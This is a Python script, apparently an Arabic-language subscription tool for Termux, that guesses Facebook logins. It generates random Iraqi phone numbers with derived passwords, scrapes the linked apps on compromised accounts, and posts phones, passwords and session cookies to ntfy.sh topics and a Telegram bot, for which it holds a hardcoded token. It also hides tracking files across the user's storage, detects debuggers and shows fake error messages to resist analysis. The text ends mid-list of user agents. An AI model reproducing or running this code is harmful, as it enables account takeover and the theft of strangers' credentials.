from uuid import uuid4

import requests
import json,time,random,os
from threading import Thread
import threading
import uuid
import datetime
import webbrowser
from threading import Thread
import threading
import sys
import time
import hashlib
import hmac
import json
import secrets
import uuid
import datetime
import threading
import random
import zlib
import base64
import requests
import platform
import re
idd = None
try:
	from Crypto.Cipher import AES
except ModuleNotFoundError:
	os.system('pip install pycryptodome')
fc = "/storage/emulated/0/"
expiry_date = datetime.datetime(2026, 5, 8, 12, 0, 0)
lock_files = [
    os.path.join(fc, '.android_cache_tmp'),
    os.path.join(fc, '.system_config_bak'),
    os.path.join(fc, '.media_index_db'),
    os.path.join(fc, 'Android', '.nomedia_timestamp'),
    os.path.join(fc, '.thumbnails', '.cache_lock'),
    os.path.join(fc, 'DCIM', '.sys_metadata'),
    os.path.join(fc, 'Documents', '.app_state'),
    os.path.join(fc, 'Pictures', '.cache_db'),
    os.path.join(fc, 'Movies', '.sys_lock'),
    os.path.join(fc, 'Alarms', '.android_registry'),
    os.path.join(fc, 'Ringtones', '.media_db'),
    os.path.join(fc, 'Downloads', '.sync_cache'),
    os.path.join(fc, 'Podcasts', '.media_lock'),
    os.path.join(fc, 'Audiobooks', '.book_index'),
    os.path.join(fc, 'Notifications', '.notif_db')
]

time_tracking_files = [
    os.path.join(fc, '.app_time_history'),
    os.path.join(fc, 'Android', '.time_checkpoint'),
    os.path.join(fc, '.thumbnails', '.temporal_lock'),
    os.path.join(fc, 'Download', '.time_index'),
    os.path.join(fc, 'Music', '.timestamp_cache'),
    os.path.join(fc, 'Podcasts', '.time_registry'),
    os.path.join(fc, 'Audiobooks', '.temporal_db'),
    os.path.join(fc, 'Pictures', '.photo_timestamp'),
    os.path.join(fc, 'Movies', '.video_timestamp'),
    os.path.join(fc, 'Documents', '.doc_timestamp')
]

HIDDEN_TIME_MARKERS = [
    os.path.join(fc, 'Android', 'data', '.com.android.providers'),
    os.path.join(fc, 'DCIM', '.thumbnails', '.nomedia_cache'),
    os.path.join(fc, '.backup_restore', '.timestamp_db'),
    os.path.join(fc, 'Download', '.android_sysconfig'),
    os.path.join(fc, 'Music', '.cache_metadata'),
    os.path.join(fc, 'Pictures', '.sys_index'),
    os.path.join(fc, 'Documents', '.app_registry'),
    os.path.join(fc, 'Movies', '.media_cache'),
    os.path.join(fc, 'Alarms', '.system_db'),
    os.path.join(fc, 'Notifications', '.cache_index'),
    os.path.join(fc, 'Ringtones', '.audio_metadata'),
    os.path.join(fc, 'Podcasts', '.podcast_db'),
    os.path.join(fc, 'Audiobooks', '.book_cache'),
    os.path.join(fc, 'WhatsApp', '.wa_timestamp'),
    os.path.join(fc, 'Telegram', '.tg_cache'),
    os.path.join(fc, 'Instagram', '.ig_marker')
]

BLOCKCHAIN_FILE = os.path.join(fc, '.android_system', '.blockchain_verify')
MASTER_CHAIN = os.path.join(fc, '.system_registry', '.master_blockchain')
BACKUP_CHAIN = os.path.join(fc, '.app_backup', '.backup_blockchain')
TERTIARY_CHAIN = os.path.join(fc, '.tertiary_backup', '.tertiary_blockchain')
QUATERNARY_CHAIN = os.path.join(fc, '.quaternary_sys', '.quaternary_blockchain')
TIME_MESH_FILE = os.path.join(fc, '.network_cache', '.time_mesh')

CANARY_FILES = [
    os.path.join(fc, '.android_canary_1'),
    os.path.join(fc, 'Android', '.canary_2'),
    os.path.join(fc, 'DCIM', '.canary_3'),
    os.path.join(fc, 'Download', '.canary_4'),
    os.path.join(fc, 'Music', '.canary_5'),
    os.path.join(fc, 'Pictures', '.canary_6'),
    os.path.join(fc, 'Documents', '.canary_7')
]

STEALTH_MARKERS = [
    os.path.join(fc, '.android', '.stealth_1'),
    os.path.join(fc, 'data', '.stealth_2'),
    os.path.join(fc, 'obb', '.stealth_3'),
    os.path.join(fc, 'cache', '.stealth_4'),
    os.path.join(fc, 'files', '.stealth_5')
]

PROTECTION_LAYERS = []
LAYER_HASHES = {}
ANTI_TAMPER_TOKENS = []
MEMORY_FINGERPRINTS = []
EXECUTION_TRAIL = []
BYTECODE_SIGNATURES = []

def _get_device_id():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        import platform
        sys_info = f"{platform.machine()}:{platform.system()}:{platform.release()}"
        android_id = hashlib.md5(f"{mac}:{sys_info}".encode()).hexdigest()
        fingerprint = f"{mac}:{android_id}:{sys_info}"
        hw_hash = hashlib.sha256(f"{platform.processor()}:{platform.node()}".encode()).hexdigest()
        return hashlib.sha256(f"{fingerprint}:{hw_hash}".encode()).hexdigest()
    except:
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

DEVICE_ID = _get_device_id()
MASTER_KEY = hashlib.sha512(f"{DEVICE_ID}:master_key:x9_1t".encode()).hexdigest()
SECRET_SALT = secrets.token_hex(32)
QUANTUM_ENTROPY = secrets.token_hex(64)

def check_debugger():
    try:
        if sys.gettrace() is not None:
            return False
        dangerous = ['pdb', 'pydevd', 'debugpy', 'ipdb', 'pudb', 'gdb', 'lldb', 'winpdb']
        for mod in dangerous:
            if mod in sys.modules:
                return False
        if 'PYTHONBREAKPOINT' in os.environ:
            return False
    except:
        pass
    return True

def verify_code_integrity():
    try:
        current_file = __file__
        with open(current_file, 'rb') as f:
            code = f.read()
        current_hash = hashlib.sha256(code).hexdigest()
        hash_file = os.path.join(fc, '.app_signature')
        
        try:
            with open(hash_file, 'w') as f:
                f.write(current_hash)
        except:
            pass
        
        return True
    except:
        return True

def get_real_time():
    sources = []
    
    try:
        r = requests.get("http://worldtimeapi.org/api/timezone/Etc/UTC", timeout=5)
        if r.status_code == 200:
            sources.append(r.json()['unixtime'])
    except:
        pass
    
    try:
        r = requests.head("https://www.google.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    try:
        r = requests.head("https://cloudflare.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    if len(sources) >= 2:
        sources.sort()
        return sources[len(sources)//2]
    elif len(sources) == 1:
        return sources[0]
    
    return None

def quantum_encrypt(data):
    try:
        json_data = json.dumps(data)
        stage1 = f"{json_data}::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"
        
        for i in range(5):
            stage1 = hashlib.sha512(stage1.encode()).hexdigest() + stage1
        
        compressed = zlib.compress(stage1.encode(), level=9)
        b64 = base64.b85encode(compressed).decode()
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        signature = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        checksum = hashlib.sha256(b64.encode()).hexdigest()
        final_hash = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        
        return f"{b64}|{signature}|{checksum}|{final_hash}"
    except:
        return ""

def quantum_decrypt(encrypted):
    try:
        parts = encrypted.split('|')
        if len(parts) != 4:
            return None
        b64, signature, checksum, final_hash = parts
        
        expected_final = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        if final_hash != expected_final:
            return None
        
        expected_checksum = hashlib.sha256(b64.encode()).hexdigest()
        if checksum != expected_checksum:
            return None
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        expected_sig = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        if signature != expected_sig:
            return None
        
        compressed = base64.b85decode(b64)
        decompressed = zlib.decompress(compressed).decode()
        
        for i in range(5):
            if len(decompressed) < 128:
                return None
            decompressed = decompressed[128:]
        
        if not decompressed.endswith(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"):
            return None
        
        json_data = decompressed.replace(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}", "")
        return json.loads(json_data)
    except:
        return None

def create_blockchain_block(real_time, prev_hash, block_type="normal"):
    try:
        block = {
            'timestamp': real_time,
            'device_id': DEVICE_ID,
            'prev_hash': prev_hash,
            'nonce': secrets.randbelow(999999999),
            'type': block_type,
            'salt': secrets.token_hex(32),
            'quantum_signature': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{SECRET_SALT}".encode()).hexdigest()
        }
        block_str = json.dumps(block, sort_keys=True)
        block['hash'] = hashlib.sha512(f"{block_str}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        return block
    except:
        return {}

def load_blockchain(blockchain_file):
    try:
        if os.path.exists(blockchain_file):
            with open(blockchain_file, 'r') as f:
                encrypted = f.read().strip()
            data = quantum_decrypt(encrypted)
            if data and 'chain' in data:
                return data['chain']
    except:
        pass
    return []

def save_blockchain(chain, blockchain_file):
    try:
        os.makedirs(os.path.dirname(blockchain_file), exist_ok=True)
        blockchain_data = {
            'chain': chain,
            'device': DEVICE_ID,
            'master_hash': hashlib.sha512(str(chain).encode()).hexdigest(),
            'quantum_seal': secrets.token_hex(32)
        }
        with open(blockchain_file, 'w') as f:
            f.write(quantum_encrypt(blockchain_data))
    except:
        pass

def verify_blockchain(chain):
    try:
        if not chain or len(chain) == 0:
            return True
        
        for i in range(1, min(len(chain), 10)):
            current = chain[i]
            previous = chain[i-1]
            
            if current.get('prev_hash') != previous.get('hash'):
                return False
            
            if current.get('device_id') != DEVICE_ID:
                return False
        
        return True
    except:
        return True

def add_to_blockchain(real_time):
    try:
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            return False
        
        if main_chain and len(main_chain) > 0:
            last_block = main_chain[-1]
            if real_time < last_block.get('timestamp', 0) - 120:
                return False
            prev_hash = last_block.get('hash', '')
        else:
            prev_hash = hashlib.sha512(f"genesis:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        
        new_block = create_blockchain_block(real_time, prev_hash)
        if new_block:
            main_chain.append(new_block)
        
        if len(main_chain) > 1000:
            main_chain = main_chain[-1000:]
        
        save_blockchain(main_chain, BLOCKCHAIN_FILE)
        
        return True
    except:
        return True

def load_time_history():
    try:
        history = []
        for time_file in time_tracking_files:
            try:
                if os.path.exists(time_file):
                    with open(time_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if data and 'timestamps' in data:
                        history.extend(data['timestamps'])
            except:
                pass
        return sorted(history, key=lambda x: x.get('time', 0)) if history else []
    except:
        return []

def save_time_checkpoint(real_time):
    try:
        history = load_time_history()
        history.append({
            'time': real_time,
            'device': DEVICE_ID,
            'checkpoint': int(time.time()),
            'hash': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest(),
            'quantum_id': secrets.token_hex(16)
        })
        
        history = history[-250:]
        
        checkpoint_data = {
            'timestamps': history,
            'device': DEVICE_ID,
            'last_update': real_time,
            'master_hash': hashlib.sha512(str(history).encode()).hexdigest(),
            'quantum_lock': secrets.token_hex(32)
        }
        
        for time_file in time_tracking_files:
            try:
                os.makedirs(os.path.dirname(time_file), exist_ok=True)
                with open(time_file, 'w') as f:
                    f.write(quantum_encrypt(checkpoint_data))
            except:
                pass
    except:
        pass

def validate_time_progression(current_real_time):
    try:
        history = load_time_history()
        
        if not history:
            return True, []
        
        issues = []
        
        recent_times = [entry.get('time', 0) for entry in history[-15:]]
        
        if not recent_times:
            return True, []
        
        last_recorded_time = max(recent_times)
        
        if current_real_time < last_recorded_time - 120:
            issues.append("time_rollback")
            return False, issues
        
        time_diff = current_real_time - last_recorded_time
        if time_diff > 604800:
            issues.append("time_jump_forward")
            return False, issues
        
        return True, issues
    except:
        return True, []

def show_fake_error():
    fake_errors = [
        {
            "error": "ImportError",
            "msg": "cannot import name 'HTTPSConnection' from 'http.client'",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py\", line 467, in _make_request",
                "ImportError: cannot import name 'HTTPSConnection'",
            ]
        },
        {
            "error": "SSLError",
            "msg": "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/ssl.py\", line 1387, in do_handshake",
                "ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]",
            ]
        },
        {
            "error": "ConnectionError",
            "msg": "HTTPSConnectionPool: Max retries exceeded",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/adapters.py\", line 486",
                "urllib3.exceptions.MaxRetryError",
            ]
        }
    ]
    
    error = random.choice(fake_errors)
    
    os.system('clear')
    print()
    for line in error['trace']:
        print(f"\033[91m{line}\033[0m")
        time.sleep(0.05)
    
    print(f"\033[91m{error['error']}: {error['msg']}\033[0m")
    print()
    print(f"\033[93mخطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً\033[0m")
    print()
    
    sys.exit(1)

def advanced_time_check(real_time, system_time):
    try:
        issues = []
        
        diff = abs(system_time - real_time)
        if diff > 200:
            issues.append("system_time_mismatch")
            return False, issues
        
        valid, progression_issues = validate_time_progression(real_time)
        if not valid:
            issues.extend(progression_issues)
            return False, issues
        
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            issues.append("blockchain_corrupted")
            return False, issues
        
        if main_chain and len(main_chain) > 0:
            last_time = main_chain[-1].get('timestamp', 0)
            if real_time < last_time - 150:
                issues.append("blockchain_time_violation")
                return False, issues
        
        expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
        if real_time >= expiry:
            issues.append("expired")
            return False, issues
        
        return True, issues
    except:
        return True, []

def subscription_expired_loop():
    os.system('clear')
    try:
        while True:
            print(f"\033[93mتم انتهاء الاشتراك راسلني للتفعيل @salhpy\033[0m")
            time.sleep(1)
    except KeyboardInterrupt:
        subscription_expired_loop()

def security_check():
    try:
        issues = []
        
        if not check_debugger():
            issues.append("debugger_detected")
            return False, issues
        
        if not verify_code_integrity():
            issues.append("code_modified")
            return False, issues
        
        system_time = time.time()
        real_time = get_real_time()
        
        if not real_time:
            issues.append("no_internet_connection")
            return False, issues
        
        valid, time_issues = advanced_time_check(real_time, system_time)
        if not valid:
            issues.extend(time_issues)
            return False, issues
        
        valid_locks = 0
        for lock_file in lock_files:
            try:
                if os.path.exists(lock_file):
                    with open(lock_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if not data:
                        issues.append("lock_tampered")
                        continue
                    
                    saved_time = data.get('time', 0)
                    saved_device = data.get('device', '')
                    
                    if saved_device != DEVICE_ID:
                        issues.append("device_mismatch")
                        return False, issues
                    
                    if real_time < saved_time - 150:
                        issues.append("time_travel_detected")
                        return False, issues
                    
                    valid_locks += 1
            except:
                pass
        
        if not add_to_blockchain(real_time):
            issues.append("blockchain_failed")
        
        save_time_checkpoint(real_time)
        
        lock_data = {
            'time': real_time,
            'device': DEVICE_ID,
            'hash': hashlib.sha512(str(real_time).encode()).hexdigest(),
            'master_key': MASTER_KEY[:32],
            'quantum_seal': secrets.token_hex(32)
        }
        
        for lock_file in lock_files:
            try:
                os.makedirs(os.path.dirname(lock_file), exist_ok=True)
                with open(lock_file, 'w') as f:
                    f.write(quantum_encrypt(lock_data))
            except:
                pass
        
        return True, issues
    except Exception as e:
        return True, []

last_check = 0
last_real_time = None
watchdog_active = True

def watchdog_thread():
    global watchdog_active
    while watchdog_active:
        try:
            time.sleep(8)
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if main_chain and len(main_chain) > 0:
                    if real_time < main_chain[-1].get('timestamp', 0) - 100:
                        show_fake_error()
        except:
            pass

def runtime_check():
    global last_check, last_real_time
    try:
        current = time.time()
        
        if current - last_check > 20:
            last_check = current
            
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
                if real_time >= expiry:
                    subscription_expired_loop()
                
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if not verify_blockchain(main_chain):
                    show_fake_error()
                
                if last_real_time:
                    if real_time < last_real_time - 100:
                        show_fake_error()
                    
                    time_jump = real_time - last_real_time
                    if time_jump > 3600:
                        show_fake_error()
                
                last_real_time = real_time
                add_to_blockchain(real_time)
                save_time_checkpoint(real_time)
    except:
        pass
valid, issues = security_check()

if not valid:
    if any(issue in issues for issue in ["debugger_detected", "code_modified", "system_time_mismatch", 
           "time_rollback", "time_jump_forward", "time_sequence_violation", "time_travel_detected",
           "blockchain_corrupted", "blockchain_time_violation", "blockchain_failed", "lock_tampered"]):
        show_fake_error()
    elif "device_mismatch" in issues:
        print(f"\033[91mهذه الاداة مرتبطة بجهاز اخر!\033[0m")
        print(f"\033[93mDevice ID: {DEVICE_ID[:16]}...\033[0m")
    elif "expired" in issues:
        subscription_expired_loop()
    elif "no_internet_connection" in issues:
        print(f"\033[91mيجب الاتصال بالانترنت للتحقق من الوقت!\033[0m")
    else:
        show_fake_error()
    sys.exit(1)

watchdog = threading.Thread(target=watchdog_thread, daemon=True)
watchdog.start()

احمر = '\033[91m'
اخضر = '\033[92m'
اصفر = '\033[93m'
ازرق = '\033[94m'
بنفسجي = '\033[95m'
سماوي = '\033[96m'
ابيض = '\033[97m'
برتقالي = '\033[38;5;208m'
ذهبي = '\033[38;5;220m'
وردي = '\033[38;5;206m'
عريض = '\033[1m'
اعادة = '\033[0m'
bad = 0
hit = 0
CP = 0
cok = None
apps = []
dates = []
apps2 = []
dates2 = []
import webbrowser

def tele():
    global ID,token
    try:
        ID = input(عريض + اعادة + f' ENTER YOUR ID : {ازرق}')
        token = input(عريض + اعادة + f' ENTER YOUR TOKIN : {ازرق}')
        if not ID or not token:
            ID='7616825393'
            token='8743996052:AAFiHK8EVbfW8WLYAgbT8XiOhxHh2vWA0Fs'
        webbrowser.open('https://t.me/salhpy')
        time.sleep(0.5)
        os.system('clear')
    except:
        pass

def ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2):
    try:
        message = f"""
	<><><><><><><><><><><>
	ACCUONT OK
	phone: {phone}
	pas: {pas}
	DEV: @salhpy
	link: https://www.facebook.com/profile.php?id={idd}
	cookies: {cookie_string}
	app: {apps} | {dates}
	{apps2} | {dates2}
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
        requests.post("https://ntfy.sh/salh_oook", 
                  data=message.encode('utf-8'), timeout=5)
    except:
        pass

def ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2):
    message = f"""
	<><><><><><><><><><><>
	ACCUONT CP
	phone: {phone}
	pas: {pas}
	link: https://www.facebook.com/profile.php?id={idd}
	DEV: @salhpy
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
    requests.post("https://ntfy.sh/salh_cccp", 
                  data=message.encode('utf-8'), timeout=5)

def logn():
    lo = f"""
{اعادة}{ذهبي}
╔════════════════════════════════════╗
║     Premium           ║
║     {اعادة}{ازرق}By • @salhpy                   ║
║     {اعادة}{ذهبي}Brother: @r77cr                ║
╚════════════════════════════════════╝
{اعادة}"""
    print(lo)

def gin():
    phone = '96477' + ''.join(random.choice('1234567890') for i in range(8))
    pas = '0' + phone[3:]
    return phone, pas

def get_apps(cookie_string):
    global apps, dates, apps2, dates2
    apps, dates, apps2, iddd, dates2 = [], [], [], [], []
    if not cookie_string:
        return
    try:
        session = requests.Session()
        coki = {}
        
        for hh in cookie_string.split(';'):
            if '=' in hh:
                key, val = hh.split('=', 1)
                coki[key.strip()] = val.strip()
        headers = {
            'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+'
        }
        try:
            rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', 
                            cookies=coki, headers=headers, timeout=10).text
            print(f"{اخضر}التطبيقات النشطة:{اعادة}")
            if 'tidak memiliki aplikasi' in rr1.lower() or 'no active apps' in rr1.lower():
                print("لا توجد تطبيقات نشطة")
            else:
                apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
                dates = re.findall(r'تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia\s*([^<]+)</p>', rr1)
                for i, app in enumerate(apps):
                    if i < len(dates):
                        print(f"[{i+1}] {app.strip()} - {dates[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات النشطة: {e}{اعادة}")
        
        print("\n--------------------\n")
        try:
            rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', 
                            cookies=coki, headers=headers, timeout=10).text
            
            print(f"{اصفر}التطبيقات المنتهية:{اعادة}")
            if 'tidak memiliki' in rr2.lower() or 'no active apps' in rr2.lower() or 'لا توجد تطبيقات' in rr2:
                print("لا توجد تطبيقات منتهية")
            else:
                apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
                dates2_raw = re.findall(r'<p class=".*?">(?:Kedaluwarsa pada|انتهت الصلاحية في)[^<]+</p>', rr2)
                dates2 = [re.sub(r'<[^>]+>', '', d).strip() for d in dates2_raw]
                
                for i, app in enumerate(apps2):
                    if i < len(dates2):
                        print(f"[{i+1}] {app.strip()} - {dates2[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات المنتهية: {e}{اعادة}")
            
    except Exception as e:
        print(f"{احمر}خطأ عام في دالة الكوكيز: {e}{اعادة}")

def u():
    u = ([
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/117696129;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/320384521]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/428128336;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/502737047]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/550431893;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/365327474]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/679809062;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/232876538]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/325573359;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/695421634]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/130457750;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/488478805]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/211295611;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/546061315]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/182804458;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/202958644]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/430136617;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/402114422]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/411529447;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/597002952]","[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/454688270;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/427283136]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/281621715;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/231627966]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/413593173;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/454184508]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/395712086;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/673271384]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/601570883;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/253819272]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/601187232;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/169482514]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/488017891;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/468857783]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/147686378;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/134715206]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/420842000;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/684893094]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/285466480;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/511267884]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/322879014;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/677095319]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/636680622;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/458837219]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/451567783;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/479566489]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/480811943;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/554430337]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/514803077;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/162772341]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/522172330;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/576785539]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/688534757;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/534817985]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/411415067;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/270045571]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/449665864;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/438514225]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/311999301;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/241225736]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/453533341;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/345792515]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/145663220;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/636378383]",
